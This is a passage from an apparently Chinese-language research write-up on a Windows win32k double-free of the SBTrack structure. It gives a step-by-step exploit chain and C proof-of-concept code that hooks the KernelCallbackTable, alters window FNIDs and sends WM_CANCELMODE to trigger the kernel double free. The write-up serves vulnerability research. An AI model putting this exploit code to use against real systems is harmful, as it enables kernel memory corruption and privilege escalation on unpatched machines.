**fnDWORD。我们知道，当一个窗口被多个其他窗口、结构引用时，即时这个窗口已经被用户调用DestoryWindow销毁掉了，窗口对象也要在内存中继续存在，以等待所有引用它的地方不再引用它才真正释放本对象内存。那么，如果我们在销毁了一个窗口后，它的最后一个引用也释放的时候，调用xxxFreeWindow时，我们就可以用FNID来控制流程是否要回到用户态的USER32!**
fnDWORD调用。所以攻击链也就此完整。
结合上面提到的，文章中提到了使用xxxSBTrackInit。该函数主要用来实现滚动条按钮的跟随鼠标滚动，当用户在一个滚动条上按下左键，表示用户想要拖动滚动条，此时需要开始处理鼠标的移动，让滚动条也跟着相应动起来，在系统中，产生SBTrack结构来标记用户鼠标的当前位置，最后当用户放开鼠标左键时，表示用户已经拖动完成，需要释放相应SBTrack结构。
在windows 2000的源代码中，xxxSBTrackInit部分代码如下：
![
](https://images.seebug.org/content/images/2019/01/ae8551c7-ca48-412d-95bf-1898f3000991.png-w331s)
![
](https://images.seebug.org/content/images/2019/01/fb92c92c-df37-4281-b5b0-99db17a1ff7b.png-w331s)
大致流程就是在调用UserAllocPoolWithQuota申请了内存后，初始化SBtrack，会将滚动条窗口以及通知窗口的指针放在本结构中，然后在2425行将当前窗口设置为捕获窗口。之后就调用xxxSBTrackLoop开始循环来处理用户的鼠标消息：
可以看到，xxxSBTrackLoop循环获取消息、判断消息、分发消息。当用户放开鼠标时，应当停止跟踪处理消息，退出xxxSBTrackLoop后回到xxxSBTrackInit之后，释放SBTrack占用的内存：
![
](https://images.seebug.org/content/images/2019/01/a39ddec6-bf00-4ed4-9443-2f8d7331308e.png-w331s)
而往上两行，可以看到在释放SBTrack之前，会解除一次spwndSBNotify窗口的引用。结合上面的分析，我们可以让这次解除引用时，回到用户态。如果在用户态释放掉SBTrack，则流程再次回到内核时，紧接着后面的UserFreePool即造成重复释放的问题。
那么我们在用户态如何释放SBTrack呢？分析发现，导致释放SBTrack一种是用户正常放开了鼠标左键，还有一种就是xxxEndScroll函数：
    void xxxEndScroll(    PWND pwnd,    BOOL fCancel){    UINT oldcmd;    PSBTRACK pSBTrack;    CheckLock(pwnd);    UserAssert(!IsWinEventNotifyDeferred());
    pSBTrack = PWNDTOPSBTRACK(pwnd);if (pSBTrack && PtiCurrent()->pq->spwndCapture == pwnd && pSBTrack->xxxpfnSB != NULL) {……..省略部分代码…….
            pSBTrack->xxxpfnSB = NULL;
            /*         * Unlock structure members so they are no longer holding down windows.         */        Unlock(&pSBTrack->spwndSB);        Unlock(&pSBTrack->spwndSBNotify);        Unlock(&pSBTrack->spwndTrack);        UserFreePool(pSBTrack);        PWNDTOPSBTRACK(pwnd) = NULL;    }}
xxxEndScroll函数判断了主要根据窗口的线程信息中存放的SBTrack和pq->sqpwndCapture（）。
![
](https://images.seebug.org/content/images/2019/01/9b16cf14-a431-4b11-8222-b3952fcbb15e.png-w331s)
而我们的程序是单线程，由于每个线程信息是属于线程的，所以线程创建的所有窗口也都指向同一线程信息结构。所以，即使SBTrack所属于的Scrollbar窗口已经释放了，只要还是同一线程创建的新窗口，pSBTrack也还是原来的。而qp->spwndCapture==pwnd如何绕过呢？我们如果创建新的窗口，给这个新窗口发送的消息和操作，pwnd则为新窗口，这显然不会等于在xxxSBTrackInit中设置的捕获窗口
----旧窗口。
通过测试发现，这个Capture窗口的设置，只要简单的在用户态调用SetCapture
API即可直接设置。所以我们只要直接调用API即可让xxxEndScroll中的判断完全通过。
在搜索之后，发现可以通过如下路径调用xxxEndScroll函数：
 ![
](https://images.seebug.org/content/images/2019/01/6d8af8dd-0416-43ee-8c20-cc79ca52f17c.png-w331s)
向一个窗口发送WM_CANCELMODE-> xxxDefWindowProc判断消息->调用xxxDWP_DoCancelMode->
xxxDWP_DoCancelMode 判断当前线程信息中pSBTrack->
xxxEndScroll。而上面我们知道，所有的窗口都在同一线程中创建，所以这里的判断也可以通过！
整理一下流程：
HOOK KernelCallbackTable->注册窗口类，WNDCLASSEXW.cbWndExtra设置为4->产生主窗口
->以主窗口作为父窗口产生一个滚动条窗口SrollBar->发送WM_LBUTTONDOWN消息->系统处理消息初始化SBTrack结构并开始循环->发生fnDWORD回调，fnDWORD回调中销毁主窗口->销毁主窗口，释放扩展字节xxxClientFreeWindowClassExtraBytes->xxxClientFreeWindowClassExtraBytes系统调用回调fnClientFreeWindowClassExtraBytesCallBack->fnClientFreeWindowClassExtraBytesCallBack
HOOK中调用NtUserSetWindowFNID更改掉窗口FNID->创建新窗口并调用SetCapture设置新窗口为捕获窗口->xxxSBLoop返回后解除主窗口引用->由于这是主窗口唯一的一个引用，这次解除导致彻底释放主窗口对象，xxxFreeWindow函数执行->由于主窗口对象的FNID已经被更改，xxxFreeWindow函数执行过程中将再一次回到用户态->用户态向新窗口发送WM_CANCELMODE消息->系统处理WM_CANCELMODE消息，释放了SBTrack->流程返回到内核继续执行xxxSBTrackInit函数最后的释放SBTrack->重复释放SBTrack！
值得说明的一点是：在上面这个流程中，完全跟sysShadow窗口没有关系，自然也跟本不需要HOOK __fnINLPCREATESTRUCT回调。
下面看一下具体代码实现：
首先，我们设置一下回调HOOK，这里就直接用fs来获取PEB了：
![
](https://images.seebug.org/content/images/2019/01/d6c48404-450a-47f8-8cb1-ec61c3980ab4.png-w331s)
创建主窗口及ScrollBar:
        WNDCLASSEXW wcex;    wcex.cbSize = sizeof(WNDCLASSEX);    wcex.style = CS_HREDRAW | CS_VREDRAW;    wcex.lpfnWndProc = DefWindowProc;    wcex.cbClsExtra = 0;    wcex.cbWndExtra = 4;     wcex.hInstance = hInstance;    wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_CVE8453));    wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);    wcex.lpszMenuName = NULL;    wcex.lpszClassName = L"WNDCLASSMAIN";    wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));
        RegisterClassExW(&wcex);    hMainWND = CreateWindowW(L"WNDCLASSMAIN", L"CVE", WS_DISABLED , 2, 2, 4, 3,nullptr, nullptr, hInstance, nullptr);
        hSBWND = CreateWindowEx(0, L"ScrollBar", L"SB", WS_CHILD | WS_VISIBLE | SBS_HORZ, 0, 0, 3, 3, hMainWND, NULL, hInstance, NULL);    之后发送WM_LBUTTONDOWN消息：    bMSGSENT = TRUE;    SendMessage(hSBWND, WM_LBUTTONDOWN, 0, 0x00020002);
这将导致系统初始化SBTrack并开始循环。这导致系统回调fnDWORD:
    void fnDWORDCallBack(PDWORD msg) {    if (*msg) {        HWND hCurrentDestroyWND = (HWND)*((DWORD*)(*msg));        memset(ClassName, 0, 0x10);        GetClassNameA(hCurrentDestroyWND, ClassName, 0xF);        if (!strcmp(ClassName, "ScrollBar")) {             if (bMSGSENT) {                 bMSGSENT = FALSE;                 DestroyWindow(hMainWND);             }        }    }    fnDWORD(msg);}
由于在运行过程中，DWORD回调会执行很多次，所以我们加一个全局变量bMSGSENT来控制。在系统执行DestroyWindow时，由于已经预留了扩展字节，所以会回调到用户HOOK：
    void fnClientFreeWindowClassExtraBytesCallBack(PDWORD msg) {
        if ((HWND)*(msg + 3) == hMainWND) {        hSBWNDnew = CreateWindowEx(0, L"ScrollBar", L"SB", SB_HORZ, 0,0, 0, 0, NULL, NULL, NULL, NULL);        SetWindowFNID(hMainWND, 0x2A1);        SetCapture(hSBWNDnew);    }    fnClientFreeWindowClassExtraBytes(msg);}
我们在fnClientFreeWindowClassExtraBytes回调中，直接设置FNID。由于后面还有捕获窗口的检查，所以我们一并创建窗口并且设置为捕获窗口。当流程回到系统后，发现捕获窗口已经改变，退出了xxxSBTrackLoop函数并开始释放SBTrack内存空间，在解除对主窗口的引用时，会导致调用xxxFreeWindow释放主窗口内存对象，由于我们已经改变了FNID，所以再次回到用户态。此时消息为0x70:
![
](https://images.seebug.org/content/images/2019/01/4447f4bd-7400-4214-8f0f-1baa7ab1bce6.jpg-w331s)
所以在fnDWORD中，判断消息：
    if ((*(msg + 1) == 0x70) && (hCurrentDestroyWND == hMainWND)) {        SendMessage(hSBWNDnew, WM_CANCELMODE, 0, 0);    }}
WM_CANCELMODE将导致SBTrack被释放，从用户态返回后，xxxSBTrack继续释放SBTrack将导致重复释放！
![
](https://images.seebug.org/content/images/2019/01/79fb6ffd-3690-4abf-930d-49eef4176505.png-w331s)
最后：非常感谢leeqwind的帮助！在分析过程中给了很大的帮助！再次感谢！极力推荐他的博客：
* * *